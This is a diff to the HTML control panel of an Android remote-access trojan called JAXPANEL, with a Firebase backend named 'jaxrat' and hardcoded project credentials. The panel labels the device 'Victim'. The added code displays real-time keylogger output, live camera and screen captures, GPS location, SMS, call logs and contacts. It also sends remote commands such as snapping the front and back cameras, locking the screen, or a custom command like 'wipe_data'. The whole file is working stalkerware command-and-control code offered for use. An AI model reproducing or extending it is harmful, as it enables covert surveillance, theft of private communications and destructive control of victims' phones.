@@ -1,81 +1,159 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>📱 Device Detail</title>
-    <!-- Include firebase -->
+    <title>📱 Device Detail - JAXPANEL</title>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-auth-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+    <script>
+        const firebaseConfig = {
+            apiKey: "AIzaSyDzA92c3IoyjhiFft3Ci6cpsvEJBXAzIfQ",
+            authDomain: "jaxrat-6813c.firebaseapp.com",
+            databaseURL: "https://jaxrat-6813c-default-rtdb.firebaseio.com",
+            projectId: "jaxrat-6813c",
+            storageBucket: "jaxrat-6813c.firebasestorage.app",
+            messagingSenderId: "750985295231",
+            appId: "1:750985295231:web:0679d4b998e52256e4d64a"
+        };
+        firebase.initializeApp(firebaseConfig);
+    </script>
     <style>
-        .tab { overflow: hidden; border-bottom: 1px solid #00ffaa; }
-        .tab button { background: #1e2745; color: white; float: left; border: none; outline: none; cursor: pointer; padding: 10px 20px; margin-right: 2px; }
+        body { background: #0a0e2a; color: white; font-family: 'Courier New'; margin: 0; padding: 20px; }
+        .header { background: #151e3d; padding: 15px; border: 1px solid #00ffaa; border-radius: 5px; margin-bottom: 20px; }
+        .tab { overflow: hidden; border-bottom: 2px solid #00ffaa; margin-bottom: 10px; }
+        .tab button { background: #1e2745; color: #00ffaa; float: left; border: none; outline: none; cursor: pointer; padding: 12px 20px; font-weight: bold; transition: 0.3s; }
         .tab button:hover { background: #2e3a60; }
         .tab button.active { background: #00ffaa; color: black; }
-        .tabcontent { display: none; padding: 20px; background: #151e3d; }
+        .tabcontent { display: none; padding: 20px; background: #151e3d; border: 1px solid #333; min-height: 400px; border-radius: 0 0 5px 5px; }
+        pre { background: #000; padding: 10px; border: 1px solid #00ffaa; color: #00ffaa; overflow-x: auto; white-space: pre-wrap; font-size: 12px; }
+        .btn-cmd { padding: 10px 20px; background: transparent; border: 1px solid #00ffaa; color: #00ffaa; cursor: pointer; margin: 5px; font-weight: bold; }
+        .btn-cmd:hover { background: #00ffaa; color: black; }
+        #liveImg { max-width: 100%; border: 2px solid #00ffaa; margin-top: 10px; }
+        .log-item { border-bottom: 1px solid #333; padding: 5px 0; font-size: 13px; }
     </style>
 </head>
 <body>
-    <div id="deviceInfo">Loading...</div>
+    <div class="header" id="deviceInfo">Loading Device Information...</div>
+
     <div class="tab">
+        <button class="tablinks active" onclick="openTab(event, 'Surveillance')">📡 Live</button>
         <button class="tablinks" onclick="openTab(event, 'Location')">📍 Lokasi</button>
         <button class="tablinks" onclick="openTab(event, 'SMS')">💬 SMS</button>
-        <button class="tablinks" onclick="openTab(event, 'Calls')">📞 Call Logs</button>
-        <button class="tablinks" onclick="openTab(event, 'Notif')">🔔 Notifikasi</button>
-        <button class="tablinks" onclick="openTab(event, 'Contacts')">👥 Kontak</button>
-        <button class="tablinks" onclick="openTab(event, 'Accounts')">🔐 Accounts</button>
-        <button class="tablinks" onclick="openTab(event, 'Commands')">⚙️ Commands</button>
+        <button class="tablinks" onclick="openTab(event, 'Logs')">📞 Call/Contacts</button>
+        <button class="tablinks" onclick="openTab(event, 'Commands')">⚙️ Controls</button>
     </div>
 
-    <div id="Location" class="tabcontent">Loading lokasi...</div>
-    <div id="SMS" class="tabcontent">Loading SMS...</div>
-    <div id="Calls" class="tabcontent">Loading Call Logs...</div>
-    <div id="Notif" class="tabcontent">Loading Notifications...</div>
-    <div id="Contacts" class="tabcontent">Loading Kontak...</div>
-    <div id="Accounts" class="tabcontent">Loading Accounts...</div>
+    <div id="Surveillance" class="tabcontent" style="display:block;">
+        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px;">
+            <div>
+                <h3>⌨️ REAL-TIME KEYLOGGER</h3>
+                <div id="keyloggerData" style="height: 350px; overflow-y: scroll; background: #000; padding: 10px; border: 1px solid #00ffaa;">
+                    Menunggu input...
+                </div>
+            </div>
+            <div>
+                <h3>📷 CAMERA / SCREEN</h3>
+                <div id="cameraData" style="text-align: center;">
+                    <img id="liveImg" src="" alt="No Image Captured">
+                    <p id="imgTime" style="font-size: 10px; color: #888;"></p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="Location" class="tabcontent">
+        <h3>📍 GPS TRACKING</h3>
+        <div id="locationData">Loading...</div>
+    </div>
+
+    <div id="SMS" class="tabcontent">
+        <h3>💬 SMS MESSAGES</h3>
+        <div id="smsData">Loading...</div>
+    </div>
+
+    <div id="Logs" class="tabcontent">
+        <h3>📞 CALL LOGS & 👥 CONTACTS</h3>
+        <div id="logsData">Loading...</div>
+    </div>
+
     <div id="Commands" class="tabcontent">
-        <input type="text" id="cmdInput" placeholder="Contoh: get_sms">
-        <button onclick="sendCommand()">Kirim Perintah</button>
-        <div id="cmdResult"></div>
+        <h3>⚙️ REMOTE DEVICE CONTROLS</h3>
+        <div style="margin-bottom: 20px;">
+            <button class="btn-cmd" onclick="quickCmd('snap_front')">📷 Snap Front Cam</button>
+            <button class="btn-cmd" onclick="quickCmd('snap_back')">📸 Snap Back Cam</button>
+            <button class="btn-cmd" onclick="quickCmd('lock')">🔒 Lock Screen</button>
+            <button class="btn-cmd" onclick="quickCmd('vibrate')">📳 Vibrate</button>
+            <button class="btn-cmd" onclick="quickCmd('location')">📍 Get GPS</button>
+        </div>
+        <hr border="0" style="border-top:1px solid #333;">
+        <p>Custom Command:</p>
+        <input type="text" id="cmdInput" style="padding: 10px; width: 300px; background: #1e2745; border: 1px solid #00ffaa; color: white;" placeholder="Contoh: wipe_data">
+        <button class="btn-cmd" onclick="sendCustomCommand()">Kirim</button>
     </div>
 
     <script>
         const urlParams = new URLSearchParams(window.location.search);
         const deviceId = urlParams.get('id');
-        
-        function loadData(path, elementId) {
+
+        // 1. INFO DEVICE (STATUS ONLINE/BATTERY)
+        firebase.database().ref(`devices/${deviceId}`).on('value', snap => {
+            const data = snap.val();
+            document.getElementById('deviceInfo').innerHTML = `
+                <h2 style="margin:0; color:#00ffaa;">📟 ${data?.model || 'Unknown'} [${data?.deviceName || 'Victim'}]</h2>
+                <p style="margin:5px 0 0 0;">OS: ${data?.os || '-'} | Battery: ${data?.battery || '-'}% | IP: ${data?.ip || 'Hidden'}</p>
+            `;
+        });
+
+        // 2. LIVE CAMERA LISTENER
+        firebase.database().ref(`live/screen/${deviceId}`).on('value', snap => {
+            if (snap.val()) {
+                document.getElementById('liveImg').src = "data:image/jpeg;base64," + snap.val();
+                document.getElementById('imgTime').innerText = "Last Captured: " + new Date().toLocaleTimeString();
+            }
+        });
+
+        // 3. KEYLOGGER LISTENER
+        firebase.database().ref(`logs/keylogger/${deviceId}`).limitToLast(20).on('value', snap => {
+            let html = '';
+            snap.forEach(child => {
+                const log = child.val();
+                html += `<div class="log-item"><span style="color:#00ffaa;">[${log.app}]</span>: ${log.content}</div>`;
+            });
+            document.getElementById('keyloggerData').innerHTML = html || 'Belum ada log ketikan.';
+            document.getElementById('keyloggerData').scrollTop = document.getElementById('keyloggerData').scrollHeight;
+        });
+
+        // 4. LOAD DATA TABS
+        function loadTabData(path, elementId) {
             firebase.database().ref(`${path}/${deviceId}`).on('value', snap => {
-                document.getElementById(elementId).innerHTML = '<pre>' + JSON.stringify(snap.val(), null, 2) + '</pre>';
+                const data = snap.val();
+                document.getElementById(elementId).innerHTML = data ? '<pre>' + JSON.stringify(data, null, 2) + '</pre>' : 'No Data Available.';
             });
         }
 
         function openTab(evt, tabName) {
-            // Sembunyikan semua tab
             document.querySelectorAll('.tabcontent').forEach(el => el.style.display = 'none');
+            document.querySelectorAll('.tablinks').forEach(el => el.classList.remove('active'));
             document.getElementById(tabName).style.display = 'block';
-            
-            // Load data sesuai tab
-            if(tabName === 'Location') loadData('locations', 'Location');
-            if(tabName === 'SMS') loadData('sms', 'SMS');
-            if(tabName === 'Calls') loadData('calls', 'Calls');
-            if(tabName === 'Notif') loadData('notifications', 'Notif');
-            if(tabName === 'Contacts') loadData('contacts', 'Contacts');
-            if(tabName === 'Accounts') loadData('accounts', 'Accounts');
+            evt.currentTarget.className += " active";
+
+            if(tabName === 'Location') loadTabData('locations', 'locationData');
+            if(tabName === 'SMS') loadTabData('sms', 'smsData');
+            if(tabName === 'Logs') loadTabData('calls', 'logsData');
         }
 
-        function sendCommand() {
+        // 5. COMMAND EXECUTION
+        function quickCmd(action) {
+            firebase.database().ref(`commands/${deviceId}`).set({
+                cmd: action,
+                timestamp: Date.now()
+            }).then(() => alert("Command " + action + " sent!"));
+        }
+
+        function sendCustomCommand() {
             const cmd = document.getElementById('cmdInput').value;
-            firebase.database().ref(`commands/${deviceId}`).push({
-                command: cmd,
-                timestamp: Date.now(),
-                status: 'pending'
-            });
-            document.getElementById('cmdResult').innerHTML = '✅ Perintah terkirim';
+            quickCmd(cmd);
         }
-
-        // Ambil info device
-        firebase.database().ref(`devices/${deviceId}`).on('value', snap => {
-            document.getElementById('deviceInfo').innerHTML = `
-                <h3>${snap.val()?.deviceName || 'Device'} (${snap.val()?.model || '-'})</h3>
-                <p>Battery: ${snap.val()?.battery || '-'}% | OS: ${snap.val()?.os || '-'}</p>
-            `;
-        });
     </script>
 </body>
 </html>
